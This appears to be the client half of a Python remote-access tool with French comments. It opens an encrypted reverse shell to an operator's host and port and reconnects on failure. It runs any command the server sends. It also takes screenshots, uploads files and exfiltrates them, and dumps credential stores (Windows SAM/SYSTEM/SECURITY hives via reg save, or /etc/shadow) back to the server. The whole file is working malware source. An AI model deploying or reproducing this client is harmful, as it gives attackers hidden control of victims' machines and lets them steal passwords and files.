import socket
import subprocess
import os
import sys
import platform
from time import sleep
from base64 import b64encode, b64decode
from aes_crypt import (
    AESCipher,
)  # Import de la classe AESCipher depuis le fichier aes_crypt
from datetime import datetime
import logging

# Configurer la journalisation
logging.basicConfig(
    filename="client.log",
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# pour le screenshot en fonction du systeme d'exploitation
# This is a hack to import PIL. ImageGrab from mss.
if platform.system() == "Windows":
    from mss import mss
else:
    from PIL import ImageGrab


class ReverseShellClient:
    def __init__(self, host, port):
        """
        Initialise la connexion au serveur.

        @param host - Le nom d'hôte du serveur.
        @param port - Le port de connexion.
        """
        self.host = host
        self.port = port
        self.conn = None

    def start(self):
        """
        Commence à écouter les commandes et les envoie au serveur indéfiniment.
        """
        while True:
            try:
                logging.info("Tentative de connexion au serveur...")
                self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.conn.connect((self.host, self.port))
                logging.info("Connecté au serveur")
                self.send_client_info()
                self.listen_for_commands()
            except Exception as e:
                logging.error(f"Erreur de connexion: {e}")
                sleep(10)

    def send_client_info(self):
        """
        Envoie des informations sur le client au serveur.
        """
        try:
            hostname = socket.gethostname()
            os_type = platform.system()
            client_info = f"{hostname}|{os_type}"
            self.send_large_data(client_info)
            logging.info(f"Infos client envoyées: {client_info}")
        except Exception as e:
            logging.error(f"Échec de l'envoi des infos client: {e}")

    def listen_for_commands(self):
        """
        Écoute et exécute les commandes reçues.
        """
        try:
            while True:
                data = self.conn.recv(4096).decode("utf-8")
                if not data:
                    break
                decrypted_data = AESCipher.decrypt(data)
                logging.info(f"Commande reçue: {decrypted_data}")
                if decrypted_data.lower() == "exit":
                    break
                elif decrypted_data.startswith("download"):
                    self.handle_download(decrypted_data)
                elif decrypted_data.startswith("upload"):
                    self.handle_upload(decrypted_data)
                elif decrypted_data.startswith("search"):
                    self.handle_search(decrypted_data)
                elif decrypted_data.startswith("hashdump"):
                    self.handle_hashdump()
                elif decrypted_data.startswith("screenshot"):
                    self.handle_screenshot()
                elif decrypted_data.startswith("ipconfig"):
                    logging.info("Gestion de ipconfig")
                    self.handle_ipconfig()
                else:
                    self.execute_command(decrypted_data)
        except Exception as e:
            logging.error(f"Erreur d'écoute des commandes: {e}")
        finally:
            self.conn.close()
            logging.info("Connexion fermée")

    def handle_download(self, command):
        """
        Gère la commande de téléchargement.
        @param command - La commande reçue du serveur.
        """
        file_path = command.split(" ", 1)[1]
        try:
            logging.info(f"Téléchargement du fichier: {file_path}")
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    self.conn.send(
                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
                            "utf-8"
                        )
                    )
            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
            logging.info(f"Fichier {file_path} envoyé avec succès")
        except Exception as e:
            logging.error(f"Échec du téléchargement {file_path}: {e}")
            self.conn.send(AESCipher.encrypt(f"ERREUR: {e}").encode("utf-8"))

    def handle_upload(self, command):
        """
        Gère la commande d'upload.
        @param command - La commande reçue du serveur contenant le chemin du fichier.
        """
        parts = command.split(" ", 2)
        file_path = parts[1]
        buffer_size = int(parts[2])
        try:
            logging.info(f"Upload du fichier: {file_path}")
            with open(file_path, "wb") as f:
                while True:
                    data = self.conn.recv(buffer_size)
                    decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
                    if decrypted_data == "EOF":
                        break
                    f.write(b64decode(decrypted_data))
            logging.info(f"Fichier {file_path} uploadé avec succès")
        except Exception as e:
            logging.error(f"Échec de l'upload {file_path}: {e}")
            self.conn.send(AESCipher.encrypt(f"ERREUR: {e}").encode("utf-8"))

    def handle_search(self, command):
        """
        Gère la commande de recherche en recherchant un fichier.
        @param command - La commande à exécuter au format "file : filename".
        """
        file_name = command.split(" ", 1)[1]
        if os.name == "nt":
            command = f"dir /s /b {file_name}"
        else:
            try:
                command = f"find / -name {file_name}"
            except Exception as e:
                logging.error(f"Échec de la recherche: {e}")
                command = f"updatedb && locate {file_name}"

        logging.info(f"Recherche du fichier: {file_name}")
        result = self.run_system_command(command)
        self.send_large_data(result)

    def handle_hashdump(self):
        """
        Gère la commande de dump de hash.
        """
        logging.info("Gestion du hashdump")
        if os.name == "nt":
            commands = [
                "reg save hklm\\sam C:\\Windows\\Temp\\sam && reg save hklm\\system C:\\Windows\\Temp\\system && reg save hklm\\security C:\\Windows\\Temp\\security",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\sam'))\"",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\system'))\"",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\security'))\"",
            ]
            result = ""
            for cmd in commands:
                result += self.run_system_command(cmd) + "\n"
        else:
            try:
                result = self.run_system_command(
                    "sudo cat /etc/shadow || cat /etc/shadow"
                )
            except subprocess.CalledProcessError as e:
                result = f"Erreur: {e.output.decode('utf-8')}"
            except Exception as e:
                result = str(e)
        self.send_large_data(result)

    def handle_screenshot(self):
        """
        Prend une capture d'écran et l'envoie au client.
        """
        try:
            timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
            file_name = f"screenshot_{timestamp}.png"
            logging.info(f"Prise de capture d'écran: {file_name}")
            screenshot = ImageGrab.grab()
            screenshot.save(file_name)
            self.send_file(file_name)
            os.remove(file_name)  # Nettoie le fichier après l'envoi
            logging.info(f"Capture d'écran {file_name} envoyée et supprimée")
        except Exception as e:
            logging.error(f"Échec de la capture d'écran: {e}")
            self.conn.send(AESCipher.encrypt(f"ERREUR: {e}").encode("utf-8"))

    def handle_ipconfig(self):
        """
        Gère la commande ipconfig et envoie le résultat au client.
        """
        try:
            if platform.system() == "Windows":
                command = 'powershell -Command "Get-NetIPAddress -InterfaceIndex 12"'
            else:
                command = "hostname -I | awk '{print $1}'"

            result = self.run_system_command(command)
            logging.info(f"Résultat de ipconfig: {result}")

            self.conn.send(
                AESCipher.encrypt(result).encode("utf-8")
                + AESCipher.encrypt("EOF").encode("utf-8")
            )
            logging.info("ipconfig géré avec succès")

        except Exception as e:
            logging.error(f"Échec de ipconfig: {e}")
            self.conn.send(AESCipher.encrypt(f"ERREUR: {e}").encode("utf-8"))

    def execute_command(self, command):
        """
        Exécute une commande et envoie le résultat au client.
        @param command - La commande à exécuter.
        """
        try:
            logging.info(f"Exécution de la commande: {command}")
            result = self.run_system_command(command)
        except Exception as e:
            result = str(e)
        self.send_large_data(result)

    def send_large_data(self, data):
        """
        Envoie des données volumineuses au client.
        @param data - Les données à envoyer au client en morceaux.
        """
        chunks = [data[i : i + 8192] for i in range(0, len(data), 4096)]
        for chunk in chunks:
            self.conn.send(AESCipher.encrypt(chunk).encode("utf-8"))
        self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))

    def run_system_command(self, command):
        """
        Exécute une commande système et retourne la sortie.
        @param command - La commande à exécuter.
        @return String avec la sortie de la commande ou le message d'erreur.
        """
        try:
            process = subprocess.Popen(
                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                logging.info(f"Sortie de commande: {stdout.decode('utf-8')}")
                return stdout.decode("utf-8")
            else:
                logging.error(f"Erreur de commande: {stderr.decode('utf-8')}")
                return stderr.decode("utf-8")
        except Exception as e:
            logging.error(f"Échec de l'exécution de la commande: {e}")
            return str(e)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python client.py <HOST> <PORT>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    client = ReverseShellClient(host, port)
    client.start()
